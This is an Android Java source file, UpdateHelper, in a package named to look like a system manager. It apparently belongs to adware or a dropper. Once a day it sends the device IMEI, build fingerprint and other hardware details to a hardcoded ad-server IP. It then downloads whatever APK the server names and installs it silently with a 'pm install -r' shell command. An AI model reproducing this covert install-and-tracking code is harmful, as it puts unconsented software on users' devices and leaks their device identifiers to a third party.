package com.android.system.manager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.telephony.TelephonyManager;

import com.android.system.manager.utils.CommonUtils;
import com.android.system.manager.utils.L;
import com.android.system.manager.utils.NetworkUtils;
import com.duowan.mobile.netroid.DefaultRetryPolicy;
import com.duowan.mobile.netroid.Listener;
import com.duowan.mobile.netroid.request.JsonObjectRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.Charset;

import static android.content.Context.TELEPHONY_SERVICE;
import static com.android.system.manager.server.MasterConstant.CORE_SERVICE;

/**
 * Created by Administrator on 2017/2/27.
 */

public class UpdateHelper extends BroadcastReceiver{
    public static final String UPDATE_PACKAGE = CORE_SERVICE[0];
    public static final String PREFS = "update";
    public static final String UPDATE_TIME_KEY = "update_time";
    public static final long UPDATE_INTERVAL = 24*60*60*1000;
    public static final long UPDATE_FAILED_INTERVAL = 60*60*1000;
    public static final int UPDATE_MSG = 0;
    private static UpdateHelper instance = new UpdateHelper();
    private HandlerThread thread;
    private Handler handler;
    private String VERSION_BASE_URL = "http://139.196.56.176/QiupAdServer/sdk_findTBNew?";
    private String DOWNLOAD_BASE_URL = "http://139.196.56.176/QiupAdServer/";
    private String NOTIFY_BASE_URL = "http://139.196.56.176/QiupAdServer/sdk_updateTBNum?";

    public static UpdateHelper getInstance(){
        return instance;
    }

    public void start(){
        thread = new HandlerThread(UpdateHelper.class.getSimpleName());
        thread.start();
        handler = new Handler(thread.getLooper()){
            @Override
            public void handleMessage(Message msg) {
                UpdateHelper.this.handleMessage(msg);
            }
        };
        IntentFilter filter = new IntentFilter();
        filter.addDataScheme("package");
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED);
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        MainApplication.getInstance().registerReceiver(this,filter);
        IntentFilter syncFilter = new IntentFilter();
        syncFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        syncFilter.addAction(Intent.ACTION_DATE_CHANGED);
        syncFilter.addAction(Intent.ACTION_TIME_CHANGED);
        syncFilter.addAction(Intent.ACTION_TIMEZONE_CHANGED);
        MainApplication.getInstance().registerReceiver(this,syncFilter);
        handler.sendEmptyMessageDelayed(UPDATE_MSG,3000);
    }

    public void onDestroy(){
        MainApplication.getInstance().unregisterReceiver(this);
        handler.removeMessages(UPDATE_MSG);
    }

    private void handleMessage(Message msg){
        switch (msg.what){
            case UPDATE_MSG:
                long wait = checkUpdate();
                if(wait > 0)
                    handler.sendEmptyMessageDelayed(UPDATE_MSG,wait);
                break;
        }
    }

    private long checkUpdate(){
//        L.d("check update");
        SharedPreferences prefs = MainApplication.getInstance().getSharedPreferences(PREFS,0);
        long lastUpdateTime = prefs.getLong(UPDATE_TIME_KEY,0);
        long curTime = System.currentTimeMillis();
        if(lastUpdateTime > curTime) {
            lastUpdateTime = curTime;
            prefs.edit().putLong(UPDATE_TIME_KEY,lastUpdateTime).commit();
        }
        if(curTime - lastUpdateTime < UPDATE_INTERVAL){
//            L.d("need to wait,update later!");
            return (UPDATE_INTERVAL + lastUpdateTime - curTime + 1000);
        }
        if(NetworkUtils.getConnectedType(MainApplication.getInstance()) != NetworkUtils.NETWORK_WIFI){
//            L.d("no wifi,update later!");
            return UPDATE_FAILED_INTERVAL;
        }
        ApplicationInfo appInfo = null;
        try {
            appInfo = MainApplication.getInstance().getPackageManager().getApplicationInfo(UPDATE_PACKAGE, PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
//            L.d("not install,update later!");
            return UPDATE_INTERVAL;
        }

        PackageInfo pi = null;
        try {
            pi=MainApplication.getInstance().getPackageManager().getPackageInfo(UPDATE_PACKAGE, 0);
        } catch (PackageManager.NameNotFoundException e) {
//            L.d("not install,update later!");
            return UPDATE_INTERVAL;
        }
        String channel = appInfo.metaData.getString("UMENG_CHANNEL");
        final int versionCode = pi.versionCode;
//        String versionUrl = VERSION_BASE_URL+"packageName="+"com.qianqi.qiupad"+"&channel="+"test";
        String params = "packageName="+UPDATE_PACKAGE+"&channel="+channel+getPhoneInfo(pi);
//        try {
//            params = URLEncoder.encode(params,"utf-8").replaceAll("\\+","%20");
//        } catch (UnsupportedEncodingException e) {
////            e.printStackTrace();
//            params = URLEncoder.encode(params).replaceAll("\\+","%20");
//        }
        String versionUrl = VERSION_BASE_URL + params.replaceAll(" ","%20");
        requestVersion(versionUrl,versionCode);
        return UPDATE_FAILED_INTERVAL;
    }

    private String getPhoneInfo(PackageInfo pi){
        String phoneInfo = "&a=" + android.os.Build.PRODUCT;
        phoneInfo += "&b=" + android.os.Build.CPU_ABI;
        phoneInfo += "&c=" + android.os.Build.VERSION_CODES.BASE;
        phoneInfo += "&d=" + android.os.Build.MODEL;
        phoneInfo += "&e=" + android.os.Build.VERSION.SDK;
        phoneInfo += "&f=" + android.os.Build.VERSION.RELEASE;
        phoneInfo += "&g=" + android.os.Build.DEVICE;
        phoneInfo += "&h=" + android.os.Build.DISPLAY;
        phoneInfo += "&i=" + android.os.Build.BRAND;
        phoneInfo += "&j=" + android.os.Build.BOARD;
        phoneInfo += "&k=" + android.os.Build.FINGERPRINT;
        phoneInfo += "&l=" + android.os.Build.ID;
        phoneInfo += "&m=" + android.os.Build.MANUFACTURER;
        phoneInfo += "&n=" + (pi != null?pi.versionCode:"null");
        phoneInfo += "&o=" + (pi != null?pi.versionName:"null");
        phoneInfo += "&p=" + CommonUtils.getDisplayWidth(MainApplication.getInstance());
        phoneInfo += "&q=" + CommonUtils.getDisplayHeight(MainApplication.getInstance());
        phoneInfo += "&r=" + CommonUtils.getTotalMemory();
        String imei = ((TelephonyManager) MainApplication.getInstance().getSystemService(TELEPHONY_SERVICE)).getDeviceId();
        phoneInfo += "&z=" + imei;
        return phoneInfo;
    }

    private void requestVersion(final String url, final int curVersion){
//        L.d("start request:"+url);
        JsonObjectRequest request = new JsonObjectRequest(url, null, new Listener<JSONObject>() {

            @Override
            public void onSuccess(JSONObject response) {
//                L.d("finish request:"+url);
                if(response != null){
                    try {
                        int netVersionCode = response.getInt("versionCode");
                        String downloadPath = response.getString("downloadPath");
                        if(netVersionCode <= curVersion){
//                            L.d("no new version!");
                            SharedPreferences prefs = MainApplication.getInstance().getSharedPreferences(PREFS,0);
                            prefs.edit().putLong(UPDATE_TIME_KEY,System.currentTimeMillis()).commit();
                            return;
                        }
                        downloadVersion(DOWNLOAD_BASE_URL+downloadPath,netVersionCode);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        request.setRetryPolicy(new DefaultRetryPolicy(2500,3,2));
        MainApplication.getInstance().getQueue().add(request);
    }

    private void downloadVersion(String url, final int version){
        File dir = MainApplication.getInstance().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
        final File apkFile = new File(dir,UPDATE_PACKAGE+"-"+version+".apk");
        if(apkFile.exists()){
            PackageInfo p = MainApplication.getInstance().getPackageManager().getPackageArchiveInfo(apkFile.getPath(),0);
            if(p != null && p.versionCode == version){
                installVersion(apkFile);
                return;
            }
        }
        apkFile.delete();
//        L.d("start download:"+version);
        final File tmpFile = new File(dir,UPDATE_PACKAGE+"-"+version+".tmp");
        String storeFilePath = tmpFile.getAbsolutePath();
        MainApplication.getInstance().getDownloader().clearAll();
        MainApplication.getInstance().getDownloader().add(storeFilePath, url, new Listener<Void>() {
            @Override
            public void onSuccess(Void response) {
//                L.d("finish download:"+version);
                if(tmpFile.exists()){
                    PackageInfo p = MainApplication.getInstance().getPackageManager().getPackageArchiveInfo(tmpFile.getPath(),0);
                    if(p != null && p.versionCode == version){
                        apkFile.delete();
                        tmpFile.renameTo(apkFile);
                        installVersion(apkFile);
                    }
                    else{
                        tmpFile.delete();
                    }
                }
            }
        });
    }

    private void installVersion(File f){
//        L.d("start install:"+f.getAbsolutePath());
        boolean result = false;
        DataOutputStream dataOutputStream = null;
        BufferedReader errorStream = null;
        try {
            String command = "pm install -r " + f.getAbsolutePath() + "\n";
            Process process = Runtime.getRuntime().exec(command);
            dataOutputStream = new DataOutputStream(process.getOutputStream());
//            dataOutputStream.write(command.getBytes(Charset.forName("utf-8")));
//            dataOutputStream.flush();
            dataOutputStream.writeBytes("exit\n");
            dataOutputStream.flush();
            process.waitFor();
            errorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String msg = "";
            String line;
            // 读取命令的执行结果
            while ((line = errorStream.readLine()) != null) {
                msg += line;
            }
//            L.d("install msg:" + msg);
            // 如果执行结果中包含Failure字样就认为是安装失败，否则就认为安装成功
            if (!msg.contains("Failure")) {
                result = true;
            }
        } catch (Exception e) {
//            L.d("install", e);
        } finally {
            try {
                if (dataOutputStream != null) {
                    dataOutputStream.close();
                }
                if (errorStream != null) {
                    errorStream.close();
                }
            } catch (IOException e) {
//                L.d("install", e);
            }
            MainApplication.getInstance().wakeClient();
            if(result){
                f.delete();
                SharedPreferences prefs = MainApplication.getInstance().getSharedPreferences(PREFS,0);
                prefs.edit().putLong(UPDATE_TIME_KEY,System.currentTimeMillis()).commit();
                notifyVersion();
            }
        }
//        return result;
    }

    private void notifyVersion(){
        String channel = "public";
        ApplicationInfo appInfo = null;
        try {
            appInfo = MainApplication.getInstance().getPackageManager().getApplicationInfo(UPDATE_PACKAGE, PackageManager.GET_META_DATA);
            channel = appInfo.metaData.getString("UMENG_CHANNEL");
        } catch (PackageManager.NameNotFoundException e) {

        }
        PackageInfo pi = null;
        try {
            pi=MainApplication.getInstance().getPackageManager().getPackageInfo(UPDATE_PACKAGE, 0);
        } catch (PackageManager.NameNotFoundException e) {

        }
        String params = "packageName="+UPDATE_PACKAGE+"&channel="+channel+getPhoneInfo(pi);
//        try {
//            params = URLEncoder.encode(params,"utf-8").replaceAll("\\+","%20");
//        } catch (UnsupportedEncodingException e) {
////            e.printStackTrace();
//            params = URLEncoder.encode(params).replaceAll("\\+","%20");
//        }
        final String notifyUrl = NOTIFY_BASE_URL + params.replaceAll(" ","%20");
//        L.d("start notify:"+notifyUrl);
        JsonObjectRequest request = new JsonObjectRequest(notifyUrl, null, new Listener<JSONObject>() {

            @Override
            public void onSuccess(JSONObject response) {
//                L.d("finish notify:"+notifyUrl);
            }
        });
        request.setRetryPolicy(new DefaultRetryPolicy(2500,3,2));
        MainApplication.getInstance().getQueue().add(request);
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if(action.equals(Intent.ACTION_PACKAGE_CHANGED) ||
                action.equals(Intent.ACTION_PACKAGE_REMOVED) ||
                action.equals(Intent.ACTION_PACKAGE_ADDED)){
            String data = intent.getDataString();
            if(data == null || data.length() < 9)
                return;
            String packageName = data.substring(8);
            if(packageName.equals(UPDATE_PACKAGE)){
                MainApplication.getInstance().wakeClient();
            }
        }
        else {
            handler.removeMessages(UPDATE_MSG);
            handler.sendEmptyMessageDelayed(UPDATE_MSG,3000);
        }
    }
}
